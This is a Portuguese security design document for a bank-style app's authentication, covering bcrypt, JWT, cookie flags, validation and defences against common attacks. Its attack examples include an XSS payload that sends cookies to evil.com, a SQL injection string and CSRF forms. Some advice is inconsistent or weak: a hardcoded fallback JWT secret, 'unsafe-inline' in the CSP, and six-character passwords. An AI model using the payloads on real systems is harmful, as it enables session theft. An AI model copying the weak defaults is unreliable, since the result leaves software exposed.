# 🔒 Segurança - Sistema de Autenticação

**Data:** 23 de fevereiro de 2026  
**Nível:** Produção-Ready  
**Padrões:** OWASP Top 10

---

## 📋 Índice

1. [Criptografia de Senhas](#criptografia-de-senhas)
2. [Tokens JWT](#tokens-jwt)
3. [Cookies Seguros](#cookies-seguros)
4. [Validações](#validações)
5. [Proteção Contra Ataques](#proteção-contra-ataques)
6. [Variáveis de Ambiente](#variáveis-de-ambiente)
7. [Boas Práticas](#boas-práticas)

---

## 🔐 Criptografia de Senhas

### bcrypt - Por que usamos?

**bcrypt** é o algoritmo de hashing de senhas mais recomendado pela indústria.

#### Vantagens:
- ✅ **Salt automático** - Cada senha tem um salt único
- ✅ **Custo ajustável** - Pode aumentar com hardware mais rápido
- ✅ **Irreversível** - Impossível extrair senha original
- ✅ **Lento propositalmente** - Dificulta ataques de força bruta
- ✅ **Padrão da indústria** - Usado por Google, Facebook, GitHub

### Como funciona?

```typescript
import bcrypt from 'bcryptjs';

// 1. REGISTRAR USUÁRIO
const plainPassword = "minhaSenha123";
const hashedPassword = await bcrypt.hash(plainPassword, 10);
// Resultado: $2b$10$N9qo8uLOickgx2ZMRZoMye.fKS5Y/6iQqCxW6WdG0QKJjmPo4nf1G

// 2. LOGIN
const isValid = await bcrypt.compare("minhaSenha123", hashedPassword);
// true ✅

const isInvalid = await bcrypt.compare("senhaErrada", hashedPassword);
// false ❌
```

### Anatomia do Hash bcrypt

```
$2b$10$N9qo8uLOickgx2ZMRZoMye.fKS5Y/6iQqCxW6WdG0QKJjmPo4nf1G
│ │  │  └─────────────────┬─────────────────┘└──────────┬──────────┘
│ │  │                    │                              │
│ │  │                  SALT (22 chars)              HASH (31 chars)
│ │  │
│ │  └─ COST FACTOR (10 rounds = 2^10 = 1024 iterações)
│ └──── VERSÃO DO ALGORITMO (2b = bcrypt revisão B)
└────── IDENTIFICADOR ($2b$ = bcrypt)
```

### Cost Factor (Rounds)

| Rounds | Tempo | Uso |
|--------|-------|-----|
| 10 | ~100ms | ✅ **Produção** (padrão recomendado) |
| 12 | ~400ms | Segurança extra |
| 14 | ~1.6s | Dados ultra-sensíveis |
| 8 | ~25ms | ❌ Desenvolvimento apenas |

**Escolhemos 10 rounds:**
- Balanço segurança vs performance
- Recomendado pela OWASP
- Usado pelo GitHub, GitLab, etc.

### Exemplo Prático

```typescript
// lib/password.ts
export async function hashPassword(password: string): Promise<string> {
  // 10 rounds = ~100ms de processamento
  // Dificulta brute force sem impactar UX
  return bcrypt.hash(password, 10);
}

export async function comparePassword(
  plain: string,
  hash: string
): Promise<boolean> {
  return bcrypt.compare(plain, hash);
}
```

### Proteção Contra Rainbow Tables

**Rainbow Table:** Tabela pré-computada de hashes de senhas comuns.

**Como bcrypt protege:**
```
SENHA: "123456"

Sem salt (INSEGURO):
  Hash: e10adc3949ba59abbe56e057f20f883e
  ⚠️ Sempre o mesmo hash! Rainbow table = GG

Com salt bcrypt (SEGURO):
  Hash1: $2b$10$N9qo8uLOickgx2ZMRZoMye.fKS5Y/6iQqCxW6WdG0QKJjmPo4nf1G
  Hash2: $2b$10$X5kl93bxZ8vYhNmO9pQrze.aB3C/7dE2fGhI4jKlM5nOpQ6rSt7uW
  Hash3: $2b$10$M3nPqR7sT9vWxY1zA3bC5d.eF7gH9iJ1kL3mN5oP7qR9sT1uV3wX7Y
  ✅ Salt diferente a cada hash! Rainbow table inútil
```

---

## 🎫 Tokens JWT

### O que é JWT?

**JWT (JSON Web Token)** é um padrão aberto (RFC 7519) para transmitir informações de forma segura entre cliente e servidor.

### Estrutura

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJjbHh5ejEyMyIsImVtYWlsIjoiam9hb0BleGVtcGxvLmNvbSIsImlhdCI6MTcwODY4NjYwMCwiZXhwIjoxNzExMjc4NjAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────┬──────────────┘ └──────────────────────────────┬──────────────────────────────┘ └──────────────┬──────────────┘
           HEADER                                       PAYLOAD                                     SIGNATURE
```

### 1. Header (Cabeçalho)

```json
{
  "alg": "HS256",  // Algoritmo: HMAC SHA-256
  "typ": "JWT"     // Tipo: JWT
}
```

### 2. Payload (Dados)

```json
{
  "userId": "clxyz123abc456def789",
  "email": "joao@exemplo.com",
  "iat": 1708686600,   // Issued At (data de criação)
  "exp": 1711278600    // Expiration (30 dias depois)
}
```

**⚠️ IMPORTANTE:** Não colocar dados sensíveis no payload!
- ❌ Senha (mesmo que hasheada)
- ❌ CPF, RG
- ❌ Dados bancários
- ✅ ID do usuário
- ✅ Email
- ✅ Nome

### 3. Signature (Assinatura)

```typescript
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  SECRET_KEY  // Chave secreta do servidor
)
```

A assinatura garante que:
- ✅ Token não foi alterado
- ✅ Token foi gerado pelo nosso servidor
- ✅ Token é válido

### Implementação

```typescript
// lib/jwt.ts
import { SignJWT, jwtVerify } from 'jose';

const SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || 'your-super-secret-key-min-32-chars'
);

// Criar token
export async function signToken(payload: { userId: string; email: string }) {
  return await new SignJWT(payload)
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('30d')  // 30 dias
    .sign(SECRET);
}

// Validar token
export async function verifyToken(token: string) {
  try {
    const { payload } = await jwtVerify(token, SECRET);
    return payload as { userId: string; email: string };
  } catch {
    return null;
  }
}
```

### Expiração

| Tipo de App | Tempo Recomendado |
|-------------|-------------------|
| Banking | 15 minutos |
| E-commerce | 1 dia |
| SaaS | 7-30 dias |
| Social Media | 60 dias |

**Banco Seguro BR: 30 dias**
- Usuários não precisam fazer login toda hora
- Segurança ainda é alta (token só no cookie HttpOnly)
- Pode ser revogado se necessário

---

## 🍪 Cookies Seguros

### Configuração

```typescript
// Ao fazer login/registro
response.cookies.set('token', jwtToken, {
  httpOnly: true,      // 🔒 JavaScript não pode acessar
  secure: true,        // 🔒 Apenas HTTPS (produção)
  sameSite: 'strict',  // 🔒 Proteção CSRF
  maxAge: 30 * 24 * 60 * 60,  // 30 dias em segundos
  path: '/',           // Disponível em todo site
});
```

### Flags de Segurança

#### 1. HttpOnly

```typescript
httpOnly: true
```

**O que faz:**
- JavaScript não pode ler o cookie
- `document.cookie` não retorna este cookie
- XSS não consegue roubar o token

**Exemplo:**
```javascript
// No console do navegador
console.log(document.cookie);
// Output: "theme=dark; lang=pt-BR"
// ✅ Token NÃO aparece!
```

#### 2. Secure

```typescript
secure: process.env.NODE_ENV === 'production'
```

**O que faz:**
- Cookie só é enviado via HTTPS
- Em desenvolvimento (localhost), pode ser false
- Em produção, OBRIGATÓRIO

**Exemplo:**
```
❌ http://bancosegurobr.com.br  → Cookie NÃO enviado
✅ https://bancosegurobr.com.br → Cookie enviado
```

#### 3. SameSite

```typescript
sameSite: 'strict'
```

**Opções:**

| Valor | Comportamento | Uso |
|-------|---------------|-----|
| `strict` | Cookie só em requests do mesmo site | ✅ **Máxima segurança** |
| `lax` | Cookie em navegação GET, mas não POST | Boa segurança |
| `none` | Cookie sempre enviado | ❌ Inseguro |

**Exemplo de proteção CSRF:**
```html
<!-- Site malicioso: evil.com -->
<form action="https://bancosegurobr.com.br/api/banks" method="POST">
  <input type="hidden" name="action" value="delete_all">
</form>
<script>
  document.forms[0].submit();
</script>

<!-- Com SameSite=strict: -->
❌ Cookie do Banco Seguro BR NÃO é enviado
❌ Request falha (não autenticado)
✅ Usuário protegido!
```

#### 4. MaxAge

```typescript
maxAge: 30 * 24 * 60 * 60  // 30 dias em segundos
```

**Cálculo:**
```
30 dias × 24 horas × 60 minutos × 60 segundos = 2.592.000 segundos
```

Após 30 dias, cookie expira automaticamente.

---

## ✅ Validações

### Email

```typescript
export function validateEmail(email: string): {
  valid: boolean;
  error?: string;
} {
  // Trim e lowercase
  const normalized = email.trim().toLowerCase();

  // Verificar se vazio
  if (!normalized) {
    return { valid: false, error: 'Email é obrigatório' };
  }

  // Regex básico (RFC 5322 simplificado)
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(normalized)) {
    return { valid: false, error: 'Email inválido' };
  }

  // Comprimento máximo
  if (normalized.length > 254) {  // RFC 5321
    return { valid: false, error: 'Email muito longo' };
  }

  return { valid: true };
}
```

**Exemplos:**
```
✅ joao@exemplo.com
✅ maria.silva@empresa.com.br
✅ user+tag@domain.co
❌ @exemplo.com (sem nome)
❌ joao@.com (sem domínio)
❌ joao@exemplo (sem TLD)
❌ joao exemplo@test.com (espaço)
```

### Senha

```typescript
export function validatePassword(password: string): {
  valid: boolean;
  error?: string;
} {
  if (!password) {
    return { valid: false, error: 'Senha é obrigatória' };
  }

  if (password.length < 6) {
    return { valid: false, error: 'Senha deve ter no mínimo 6 caracteres' };
  }

  // bcrypt suporta até 72 bytes
  if (password.length > 72) {
    return { valid: false, error: 'Senha muito longa (máximo 72 caracteres)' };
  }

  return { valid: true };
}
```

**Por que mínimo 6?**
- Balanço entre segurança e UX
- Com bcrypt, 6 caracteres já é razoavelmente seguro
- Força mais pode afastar usuários

**Força da senha (opcional):**
```typescript
export function getPasswordStrength(password: string): 'weak' | 'medium' | 'strong' {
  let score = 0;

  if (password.length >= 8) score++;
  if (password.length >= 12) score++;
  if (/[a-z]/.test(password)) score++;
  if (/[A-Z]/.test(password)) score++;
  if (/[0-9]/.test(password)) score++;
  if (/[^a-zA-Z0-9]/.test(password)) score++;

  if (score <= 2) return 'weak';
  if (score <= 4) return 'medium';
  return 'strong';
}
```

### Nome

```typescript
export function validateName(name: string): {
  valid: boolean;
  error?: string;
} {
  const trimmed = name.trim();

  if (!trimmed) {
    return { valid: false, error: 'Nome é obrigatório' };
  }

  if (trimmed.length < 2) {
    return { valid: false, error: 'Nome muito curto' };
  }

  if (trimmed.length > 100) {
    return { valid: false, error: 'Nome muito longo' };
  }

  // Apenas letras, espaços, hífens, apóstrofos, acentos
  const nameRegex = /^[a-zA-ZÀ-ÿ\s'-]+$/;
  if (!nameRegex.test(trimmed)) {
    return { valid: false, error: 'Nome contém caracteres inválidos' };
  }

  return { valid: true };
}
```

---

## 🛡️ Proteção Contra Ataques

### 1. SQL Injection

**Ataque:**
```sql
-- Input malicioso
email: admin@example.com' OR '1'='1

-- SQL gerado (sem proteção):
SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
-- Retorna TODOS os usuários! 🚨
```

**Proteção:**
```typescript
// ✅ Prisma ORM usa prepared statements
const user = await prisma.user.findUnique({
  where: { email: userEmail }  // Escape automático!
});

// SQL executado (seguro):
-- Parâmetros: $1 = "admin@example.com' OR '1'='1"
SELECT * FROM users WHERE email = $1
-- Busca literalmente por esse email estranho (não existe) ✅
```

### 2. XSS (Cross-Site Scripting)

**Ataque:**
```javascript
// Input malicioso no campo nome
name: "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
```

**Proteção:**

1. **React escape automático:**
```tsx
// React escapa automaticamente
<h1>Bem-vindo, {user.name}</h1>

// Renderizado no HTML:
<h1>Bem-vindo, &lt;script&gt;fetch(...)&lt;/script&gt;</h1>
// Script não executa! ✅
```

2. **CSP (Content Security Policy):**
```typescript
// next.config.ts
const cspHeader = `
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https: data:;
  connect-src 'self' https://api.dicebear.com;
`;

export default {
  headers: async () => [{
    source: '/:path*',
    headers: [
      { key: 'Content-Security-Policy', value: cspHeader }
    ]
  }]
};
```

### 3. CSRF (Cross-Site Request Forgery)

**Ataque:**
```html
<!-- Site malicioso: evil.com -->
<form action="https://bancosegurobr.com.br/api/auth/logout" method="POST">
  <input type="submit" value="Clique aqui para ganhar R$1000!">
</form>
```

**Proteção:**

1. **SameSite Cookie:**
```typescript
sameSite: 'strict'
// Cookie NÃO é enviado em requests de outros sites ✅
```

2. **Token CSRF (extra):**
```typescript
// Futuro: adicionar CSRF token em formulários
<input type="hidden" name="csrf_token" value={csrfToken} />
```

### 4. Brute Force

**Ataque:**
```
Tentativa 1: teste@email.com / 123456  ❌
Tentativa 2: teste@email.com / password ❌
Tentativa 3: teste@email.com / qwerty  ❌
... (milhões de tentativas)
```

**Proteção:**

1. **bcrypt lento:**
```typescript
// Cada tentativa leva ~100ms
// 10.000 tentativas = 16 minutos!
await bcrypt.compare(password, hash);  // ~100ms
```

2. **Rate Limiting (futuro):**
```typescript
// Limite: 5 tentativas por minuto
// Após 5 falhas: aguardar 1 minuto
```

### 5. Man-in-the-Middle (MITM)

**Ataque:**
```
Cliente → [Hacker intercepta] → Servidor
```

**Proteção:**

1. **HTTPS obrigatório:**
```typescript
// Produção: sempre HTTPS
secure: process.env.NODE_ENV === 'production'
```

2. **HSTS Header:**
```typescript
// next.config.ts
headers: [{
  key: 'Strict-Transport-Security',
  value: 'max-age=31536000; includeSubDomains'
}]
```

---

## 🔑 Variáveis de Ambiente

### .env.local

```bash
# JWT Secret (NUNCA compartilhar!)
# Gerar: openssl rand -base64 32
JWT_SECRET=your-super-secret-key-minimum-32-characters-long-12345678

# Database
DATABASE_URL=postgresql://user:password@localhost:5432/banco_seguro

# Node Environment
NODE_ENV=development
```

### Gerando JWT_SECRET seguro

**Opção 1: OpenSSL**
```bash
openssl rand -base64 32
# Output: K7gNU3sdo+OL0wNhqoVWhr3g6s1xYv72ol/pe/Unols=
```

**Opção 2: Node.js**
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"
# Output: XbPeShVmYq3t6w9z$C&F)J@McQfTjWnZ
```

**Opção 3: PowerShell**
```powershell
-join ((48..57) + (65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})
# Output: aB3dEfGh9JkLmNpQrStUvWxYz1234567
```

### Checklist de Segurança

```typescript
// ❌ NUNCA fazer isso!
const SECRET = 'mysecret';  // Muito curto
const SECRET = '123456';    // Muito fraco
const SECRET = 'senha';     // Muito óbvio

// ✅ Sempre fazer isso:
const SECRET = process.env.JWT_SECRET;  // Variável de ambiente
if (!SECRET || SECRET.length < 32) {
  throw new Error('JWT_SECRET inválido!');
}
```

---

## ✅ Boas Práticas

### 1. Nunca Logar Senhas

```typescript
// ❌ ERRADO
console.log('Login attempt:', { email, password });
logger.info('User registered', { name, email, password });

// ✅ CORRETO
console.log('Login attempt:', { email });
logger.info('User registered', { name, email });
```

### 2. Nunca Retornar Senhas

```typescript
// ❌ ERRADO
const user = await prisma.user.findUnique({ where: { email } });
return user;  // Inclui password!

// ✅ CORRETO
const user = await prisma.user.findUnique({
  where: { email },
  select: {
    id: true,
    name: true,
    email: true,
    avatar: true,
    // password: false (não incluir)
  }
});
return user;
```

### 3. Mensagens de Erro Genéricas

```typescript
// ❌ ERRADO (revela informação)
if (!user) return { error: 'Email não encontrado' };
if (!validPassword) return { error: 'Senha inválida' };

// ✅ CORRETO (genérico)
if (!user || !validPassword) {
  return { error: 'Email ou senha inválidos' };
}
```

### 4. Validar SEMPRE no Servidor

```typescript
// ✅ Cliente valida (UX)
if (!email) return setError('Email obrigatório');

// ✅ Servidor valida também (segurança)
if (!email || !validateEmail(email).valid) {
  return NextResponse.json(
    { error: 'Email inválido' },
    { status: 400 }
  );
}
```

### 5. HTTPS em Produção

```typescript
// vercel.json ou next.config.ts
{
  "headers": [{
    "source": "/(.*)",
    "headers": [{
      "key": "Strict-Transport-Security",
      "value": "max-age=31536000; includeSubDomains; preload"
    }]
  }]
}
```

---

## 📊 Checklist de Segurança Final

- [ ] ✅ Senhas hasheadas com bcrypt (10 rounds)
- [ ] ✅ JWT com secret forte (32+ caracteres)
- [ ] ✅ Cookies HttpOnly + Secure + SameSite
- [ ] ✅ Validações no cliente E servidor
- [ ] ✅ Prisma ORM (proteção SQL injection)
- [ ] ✅ React escape automático (proteção XSS)
- [ ] ✅ HTTPS em produção
- [ ] ✅ Mensagens de erro genéricas
- [ ] ✅ Nunca logar/retornar senhas
- [ ] ✅ JWT_SECRET em variável de ambiente
- [ ] ⏳ Rate limiting (futuro)
- [ ] ⏳ Email verification (futuro)
- [ ] ⏳ 2FA (futuro)

---

**Última atualização:** 23 de fevereiro de 2026  
**Próxima revisão:** Após deploy em produção
